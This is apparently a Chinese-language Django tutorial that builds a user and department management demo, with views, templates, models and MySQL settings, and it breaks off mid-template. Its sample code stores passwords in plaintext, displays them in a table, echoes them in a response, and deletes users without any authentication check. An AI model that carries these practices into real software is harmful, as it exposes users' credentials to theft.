<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">&quot;en&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span><span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;UTF-8&quot;</span>&gt;</span><span class="tag">&lt;<span class="name">title</span>&gt;</span>Title<span class="tag">&lt;/<span class="name">title</span>&gt;</span><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">table</span> <span class="attr">border</span>=<span class="string">&quot;1&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">thead</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">tr</span>&gt;</span><span class="tag">&lt;<span class="name">th</span>&gt;</span>ID<span class="tag">&lt;/<span class="name">th</span>&gt;</span><span class="tag">&lt;<span class="name">th</span>&gt;</span>Name<span class="tag">&lt;/<span class="name">th</span>&gt;</span><span class="tag">&lt;<span class="name">th</span>&gt;</span>Password<span class="tag">&lt;/<span class="name">th</span>&gt;</span><span class="tag">&lt;<span class="name">th</span>&gt;</span>Age<span class="tag">&lt;/<span class="name">th</span>&gt;</span><span class="tag">&lt;/<span class="name">tr</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">thead</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">tbody</span>&gt;</span></span><br><span class="line">        &#123;% for user in user_list %&#125;</span><br><span class="line">            <span class="tag">&lt;<span class="name">tr</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">td</span>&gt;</span>&#123;&#123; user.id &#125;&#125;<span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">td</span>&gt;</span>&#123;&#123; user.name &#125;&#125;<span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">td</span>&gt;</span>&#123;&#123; user.password &#125;&#125;<span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">td</span>&gt;</span>&#123;&#123; user.age &#125;&#125;<span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">tr</span>&gt;</span></span><br><span class="line">        &#123;% endfor %&#125;</span><br><span class="line">        <span class="tag">&lt;/<span class="name">tbody</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">table</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>

<h3><span id="添加用户">添加用户</span></h3><p>用户在页面的表单上输入用户信息, 再通过POST请求提交<br>demo1&#x2F;urls.py</p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line">urlpatterns = [</span><br><span class="line">	<span class="comment"># ...</span></span><br><span class="line">    path(<span class="string">&#x27;info/add/&#x27;</span>, views.user_add),</span><br><span class="line">]</span><br></pre></td></tr></table></figure>

<p>app01&#x2F;views.py</p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> app01.models <span class="keyword">import</span> Department,UserInfo</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">user_add</span>(<span class="params">request</span>):</span><br><span class="line">    <span class="keyword">if</span> request.method == <span class="string">&quot;GET&quot;</span>:</span><br><span class="line">        <span class="keyword">return</span> render(request, <span class="string">&quot;user_add.html&quot;</span>)</span><br><span class="line"></span><br><span class="line">    username = request.POST.get(<span class="string">&quot;user&quot;</span>)</span><br><span class="line">    password = request.POST.get(<span class="string">&quot;password&quot;</span>)</span><br><span class="line">    age = request.POST.get(<span class="string">&quot;age&quot;</span>)</span><br><span class="line">    UserInfo.objects.create(name=username, password=password, age=age)</span><br><span class="line">    <span class="keyword">return</span> HttpResponse(<span class="string">&quot;ADD USER &#123;&#125; pwd: &#123;&#125; age: &#123;&#125; Done&quot;</span>.<span class="built_in">format</span>(username, password, age))</span><br></pre></td></tr></table></figure>

<p>app01&#x2F;templates&#x2F;user_add.html</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;% load static %&#125;</span><br><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html lang=&quot;en&quot;&gt;</span><br><span class="line">&lt;head&gt;&lt;meta charset=&quot;UTF-8&quot;&gt;&lt;title&gt;User Add&lt;/title&gt;&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">    &lt;form method=&quot;post&quot;&gt; &lt;!-- action可以省略 --&gt;</span><br><span class="line">        &#123;% csrf_token %&#125;</span><br><span class="line">        &lt;input type=&quot;text&quot; name=&quot;user&quot;, placeholder=&quot;username&quot; /&gt;</span><br><span class="line">        &lt;input type=&quot;text&quot; name=&quot;password&quot;, placeholder=&quot;password&quot; /&gt;</span><br><span class="line">        &lt;input type=&quot;text&quot; name=&quot;age&quot;, placeholder=&quot;age&quot; /&gt;</span><br><span class="line">        &lt;input type=&quot;submit&quot; value=&quot;submit&quot; /&gt;</span><br><span class="line">    &lt;/form&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>
<p>注：如果POST提交地址和当前页面地址一样，可以省略action&#x3D;”&#x2F;user&#x2F;add&#x2F;“</p>
<p>添加成功后自动跳转到用户页面<br>app01&#x2F;views.py</p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">user_add</span>(<span class="params">request</span>):</span><br><span class="line">	<span class="comment"># ...</span></span><br><span class="line">    <span class="keyword">return</span> redirect(<span class="string">&quot;/user/info&quot;</span>)</span><br></pre></td></tr></table></figure>

<p>在用户页面中支持新增用户的功能</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;/user/add&quot;</span>&gt;</span>Add User<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br></pre></td></tr></table></figure>

<h3><span id="删除用户">删除用户</span></h3><p>demo1&#x2F;urls.py</p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> app01 <span class="keyword">import</span> views</span><br><span class="line">urlpatterns = [</span><br><span class="line">    path(<span class="string">&#x27;user/delete/&#x27;</span>, views.user_delete),</span><br><span class="line">]</span><br></pre></td></tr></table></figure>

<p>app01&#x2F;views.py</p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">user_delete</span>(<span class="params">request</span>):</span><br><span class="line">    <span class="keyword">if</span> request.method == <span class="string">&quot;GET&quot;</span>:</span><br><span class="line">        <span class="keyword">return</span> render(request, <span class="string">&quot;user_delete.html&quot;</span>)</span><br><span class="line">    <span class="comment"># POST</span></span><br><span class="line">    username = request.POST.get(<span class="string">&quot;user&quot;</span>)</span><br><span class="line">    UserInfo.objects.<span class="built_in">filter</span>(name=username).delete()</span><br><span class="line">    <span class="keyword">return</span> redirect(<span class="string">&quot;/user/info&quot;</span>)</span><br></pre></td></tr></table></figure>

<p>app01&#x2F;templates&#x2F;user_delete.html</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line">&#123;% load static %&#125;</span><br><span class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">&quot;en&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span><span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;UTF-8&quot;</span>&gt;</span><span class="tag">&lt;<span class="name">title</span>&gt;</span>User Delete<span class="tag">&lt;/<span class="name">title</span>&gt;</span><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">form</span> <span class="attr">method</span>=<span class="string">&quot;post&quot;</span>&gt;</span></span><br><span class="line">        &#123;% csrf_token %&#125;</span><br><span class="line">        <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;text&quot;</span> <span class="attr">name</span>=<span class="string">&quot;user&quot;</span>, <span class="attr">placeholder</span>=<span class="string">&quot;username&quot;</span> /&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">&quot;submit&quot;</span> <span class="attr">value</span>=<span class="string">&quot;submit&quot;</span> /&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>

<h2><span id="demo-员工管理系统">Demo: 员工管理系统</span></h2><h3><span id="创建项目">创建项目</span></h3><p>创建Django项目和APP</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">django-admin startproject webproj</span><br><span class="line">python3 manage.py startapp app01</span><br></pre></td></tr></table></figure>
<p>注册APP<br>demo1&#x2F;settings.py</p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line">INSTALLED_APPS = [</span><br><span class="line">    <span class="string">&#x27;django.contrib.admin&#x27;</span>,</span><br><span class="line">	<span class="comment"># ...</span></span><br><span class="line">    <span class="string">&#x27;app01.apps.App01Config&#x27;</span>, <span class="comment"># Add your app config here !</span></span><br><span class="line">]</span><br></pre></td></tr></table></figure>
<p>运行</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">python3 manage.py runserver 0.0.0.0:8000</span><br></pre></td></tr></table></figure>

<h3><span id="设计表结构">设计表结构</span></h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># 部门表</span><br><span class="line">id title</span><br><span class="line">1  研发</span><br><span class="line">2  销售</span><br><span class="line"></span><br><span class="line"># 员工表</span><br><span class="line">id name password age account create_time depart_id</span><br><span class="line">1  Tony 123      18</span><br><span class="line">2</span><br></pre></td></tr></table></figure>

<p>思考题: 如果部门删除，员工表怎么处理？</p>
<ul>
<li>如果部门删除，员工也要裁掉 (级联删除)</li>
<li>员工不裁掉，可以置空</li>
</ul>
<p>实际开发中为什么大公司要禁用外键约束？<a href="https://developer.aliyun.com/article/1171702">https://developer.aliyun.com/article/1171702</a></p>
<p>models.py</p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Department</span>(models.Model):</span><br><span class="line">    <span class="string">&quot;&quot;&quot; 部门表 &quot;&quot;&quot;</span></span><br><span class="line">    title = models.CharField(max_length=<span class="number">32</span>)</span><br><span class="line"><span class="keyword">class</span> <span class="title class_">UserInfo</span>(models.Model):</span><br><span class="line">    <span class="string">&quot;&quot;&quot; 员工表 &quot;&quot;&quot;</span></span><br><span class="line">    name = models.CharField(max_length=<span class="number">16</span>)</span><br><span class="line">    password = models.CharField(max_length=<span class="number">64</span>)</span><br><span class="line">    age = models.CharField()</span><br><span class="line">    account = models.DecimalField(max_digits=<span class="number">10</span>,decimal_places=<span class="number">2</span>, default=<span class="number">0</span>)</span><br><span class="line">    create_time = models.DateTimeField()</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 部门ID, 外键, 级联删除, 允许部门为空</span></span><br><span class="line">    depart = models.ForeignKey(to=<span class="string">&quot;Department&quot;</span>, to_field=<span class="string">&quot;id&quot;</span>,null=<span class="literal">True</span>, blank=<span class="literal">True</span>, on_delete=models.CASCADE)</span><br><span class="line"></span><br><span class="line">	gender_choices = (</span><br><span class="line">        (<span class="number">1</span>, <span class="string">&quot;男&quot;</span>),</span><br><span class="line">        (<span class="number">2</span>, <span class="string">&quot;女&quot;</span>),</span><br><span class="line">    )</span><br><span class="line">    gender = models.SmallIntegerField(verbose_name=<span class="string">&quot;gender&quot;</span>, choices=gender_choices)</span><br></pre></td></tr></table></figure>

<h3><span id="mysql生成数据库">MySQL生成数据库</span></h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mysql&gt; create database gx_day16 DEFAULT CHARSET utf8 COLLATE utf8_general_ci;</span><br></pre></td></tr></table></figure>
<p>settings.py</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">DATABASES = &#123;</span><br><span class="line">	&#x27;default&#x27;: &#123;</span><br><span class="line">		&#x27;ENGINE&#x27;: &#x27;django.db.backends.mysql&#x27;,</span><br><span class="line">		&#x27;NAME&#x27;: &#x27;gx_day16&#x27;,</span><br><span class="line">		&#x27;USER&#x27;: &#x27;root&#x27;,</span><br><span class="line">		&#x27;PASSWORD&#x27;: &#x27;XXX&#x27;,</span><br><span class="line">		&#x27;HOST&#x27;: &#x27;localhost&#x27;,</span><br><span class="line">		&#x27;PORT&#x27;: 3306,</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>根目录执行</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">python3 manage.py makemigrations</span><br><span class="line">python3 manage.py migrate</span><br></pre></td></tr></table></figure>

<h3><span id="创建静态文件和模板文件">创建静态文件和模板文件</span></h3><p>app目录下创建static, templates, 引入bootstrap, js</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">static/</span><br><span class="line">├── js</span><br><span class="line">│   └── jquery-3.7.1.min.js</span><br><span class="line">└── plugins</span><br><span class="line">    └── bootstrap-3.4.1</span><br></pre></td></tr></table></figure>

<h3><span id="新增页面-部门列表">新增页面 —— 部门列表</span></h3><p>webproj&#x2F;urls.py</p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> app01 <span class="keyword">import</span> views</span><br><span class="line">urlpatterns = [</span><br><span class="line">    path(<span class="string">&#x27;depart/list/&#x27;</span>, views.depart_list),</span><br><span class="line">]</span><br></pre></td></tr></table></figure>
<p>app01&#x2F;views.py</p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">depart_list</span>(<span class="params">request</span>):</span><br><span class="line">	<span class="keyword">return</span> render(request, <span class="string">&#x27;depart_list.html&#x27;</span>)</span><br></pre></td></tr></table></figure>

<p>app01&#x2F;templates&#x2F;depart_list.html</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line">&#123;% load static %&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">&quot;en&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;UTF-8&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>Title<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">link</span> <span class="attr">rel</span>=<span class="string">&quot;stylesheet&quot;</span> <span class="attr">href</span>=<span class="string">&quot;&#123;% static &#x27;plugins/bootstrap-3.4.1/css/bootstrap.css&#x27; %&#125;&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">    <span class="comment">&lt;!-- 导航 --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">nav</span> <span class="attr">class</span>=<span class="string">&quot;navbar navbar-default&quot;</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;container-fluid&quot;</span>&gt;</span></span><br><span class="line">        <span class="comment">&lt;!-- Brand and toggle get grouped for better mobile display --&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;navbar-header&quot;</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;<span class="name">button</span> <span class="attr">type</span>=<span class="string">&quot;button&quot;</span> <span class="attr">class</span>=<span class="string">&quot;navbar-toggle collapsed&quot;</span> <span class="attr">data-toggle</span>=<span class="string">&quot;collapse&quot;</span> <span class="attr">data-target</span>=<span class="string">&quot;#bs-example-navbar-collapse-1&quot;</span> <span class="attr">aria-expanded</span>=<span class="string">&quot;false&quot;</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">span</span> <span class="attr">class</span>=<span class="string">&quot;sr-only&quot;</span>&gt;</span>Toggle navigation<span class="tag">&lt;/<span class="name">span</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">span</span> <span class="attr">class</span>=<span class="string">&quot;icon-bar&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">span</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">span</span> <span class="attr">class</span>=<span class="string">&quot;icon-bar&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">span</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">span</span> <span class="attr">class</span>=<span class="string">&quot;icon-bar&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">span</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;/<span class="name">button</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;<span class="name">a</span> <span class="attr">class</span>=<span class="string">&quot;navbar-brand&quot;</span> <span class="attr">href</span>=<span class="string">&quot;#&quot;</span>&gt;</span>用户管理系统<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">&lt;!-- Collect the nav links, forms, and other content for toggling --&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;collapse navbar-collapse&quot;</span> <span class="attr">id</span>=<span class="string">&quot;bs-example-navbar-collapse-1&quot;</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;<span class="name">ul</span> <span class="attr">class</span>=<span class="string">&quot;nav navbar-nav&quot;</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">li</span>&gt;</span><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;#&quot;</span>&gt;</span>部门管理<span class="tag">&lt;/<span class="name">a</span>&gt;</span><span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">li</span>&gt;</span><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;#&quot;</span>&gt;</span>用户管理<span class="tag">&lt;/<span class="name">a</span>&gt;</span><span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;/<span class="name">ul</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;<span class="name">ul</span> <span class="attr">class</span>=<span class="string">&quot;nav navbar-nav navbar-right&quot;</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">li</span>&gt;</span><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;#&quot;</span>&gt;</span>登录<span class="tag">&lt;/<span class="name">a</span>&gt;</span><span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">li</span> <span class="attr">class</span>=<span class="string">&quot;dropdown&quot;</span>&gt;</span></span><br><span class="line">              <span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;#&quot;</span> <span class="attr">class</span>=<span class="string">&quot;dropdown-toggle&quot;</span> <span class="attr">data-toggle</span>=<span class="string">&quot;dropdown&quot;</span> <span class="attr">role</span>=<span class="string">&quot;button&quot;</span> <span class="attr">aria-haspopup</span>=<span class="string">&quot;true&quot;</span> <span class="attr">aria-expanded</span>=<span class="string">&quot;false&quot;</span>&gt;</span>当前用户<span class="tag">&lt;<span class="name">span</span> <span class="attr">class</span>=<span class="string">&quot;caret&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">span</span>&gt;</span><span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line">              <span class="tag">&lt;<span class="name">ul</span> <span class="attr">class</span>=<span class="string">&quot;dropdown-menu&quot;</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">li</span>&gt;</span><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;#&quot;</span>&gt;</span>个人资料<span class="tag">&lt;/<span class="name">a</span>&gt;</span><span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">li</span>&gt;</span><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;#&quot;</span>&gt;</span>我的信息<span class="tag">&lt;/<span class="name">a</span>&gt;</span><span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">li</span>&gt;</span><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;#&quot;</span>&gt;</span>注销<span class="tag">&lt;/<span class="name">a</span>&gt;</span><span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">li</span> <span class="attr">role</span>=<span class="string">&quot;separator&quot;</span> <span class="attr">class</span>=<span class="string">&quot;divider&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">li</span>&gt;</span><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;#&quot;</span>&gt;</span>Separated link<span class="tag">&lt;/<span class="name">a</span>&gt;</span><span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">              <span class="tag">&lt;/<span class="name">ul</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;/<span class="name">ul</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">nav</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">&lt;!-- 内容 --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;container-fluid&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">div</span> <span class="attr">style</span>=<span class="string">&quot;margin-bottom: 18px&quot;</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">a</span> <span class="attr">class</span>=<span class="string">&quot;btn btn-primary&quot;</span> <span class="attr">href</span>=<span class="string">&quot;#&quot;</span>&gt;</span>新建部门<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;panel panel-default&quot;</span>&gt;</span></span><br><span class="line">        <span class="comment">&lt;!-- Default panel contents --&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;panel-heading&quot;</span>&gt;</span>部门列表<span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">        <span class="comment">&lt;!-- Table --&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">table</span> <span class="attr">class</span>=<span class="string">&quot;table table-bordered&quot;</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">thead</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">tr</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">th</span>&gt;</span>ID<span class="tag">&lt;/<span class="name">th</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">th</span>&gt;</span>Name<span class="tag">&lt;/<span class="name">th</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">th</span>&gt;</span>Operation<span class="tag">&lt;/<span class="name">th</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;/<span class="name">tr</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">thead</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">tbody</span>&gt;</span></span><br><span class="line">				&#123;% for d in departs %&#125;</span><br><span class="line">                <span class="tag">&lt;<span class="name">tr</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">td</span>&gt;</span>&#123;&#123; d.id &#125;&#125;<span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">td</span>&gt;</span>&#123;&#123; d.title &#125;&#125;<span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">td</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">a</span> <span class="attr">class</span>=<span class="string">&quot;btn btn-primary&quot;</span>&gt;</span>Edit<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">a</span> <span class="attr">class</span>=<span class="string">&quot;btn btn-danger&quot;</span>&gt;</span>Delete<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;/<span class="name">td</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;/<span class="name">tr</span>&gt;</span></span><br><span class="line">				&#123;% endfor %&#125;</span><br><span class="line">            <span class="tag">&lt;/<span class="name">tbody</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">table</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">&quot;&#123;% static &#x27;js/jquery-3.7.1.min.js&#x27; %&#125;&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">&quot;&#123;% static &#x27;plugins/bootstrap-3.4.1/js/bootstrap.js&#x27; %&#125;&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>页面效果:<br><img data-src="/2024/0915151753/image1.png"></p>
<h3><span id="新增页面-添加部门">新增页面 —— 添加部门</span></h3><p>app01&#x2F;templates&#x2F;depart_list.html</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;container-fluid&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">div</span> <span class="attr">style</span>=<span class="string">&quot;margin-bottom: 18px&quot;</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">a</span> <span class="attr">class</span>=<span class="string">&quot;btn btn-success&quot;</span> <span class="attr">href</span>=<span class="string">&quot;/depart/add/&quot;</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">span</span> <span class="attr">class</span>=<span class="string">&quot;glyphicon glyphicon-plus-sign&quot;</span> <span class="attr">aria-hidden</span>=<span class="string">&quot;true&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">span</span>&gt;</span></span><br><span class="line">                新建部门</span><br><span class="line">            <span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>webproj&#x2F;urls.py</p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line">urlpatterns = [</span><br><span class="line">    path(<span class="string">&#x27;depart/add/&#x27;</span>, views.depart_add),</span><br><span class="line">]</span><br></pre></td></tr></table></figure>

<p>depart_add.html</p>
<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="comment">&lt;!-- 带标题的面板 --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;panel panel-default&quot;</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;panel-heading&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">h3</span> <span class="attr">class</span>=<span class="string">&quot;panel-title&quot;</span>&gt;</span>添加部门<span class="tag">&lt;/<span class="name">h3</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">div</span> <span class="attr">class</span>=<span class="string">&quot;panel-body&quot;</span>&gt;</span></span><br><span class="line">        <span class="comment">&lt;!-- 水平排列的表单 --&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">form</span> <span class="attr">method</span>=<span class="string">&quot;post&quot;</span>&gt;</span></span><br><span class="line">          &#123;% csrf_token 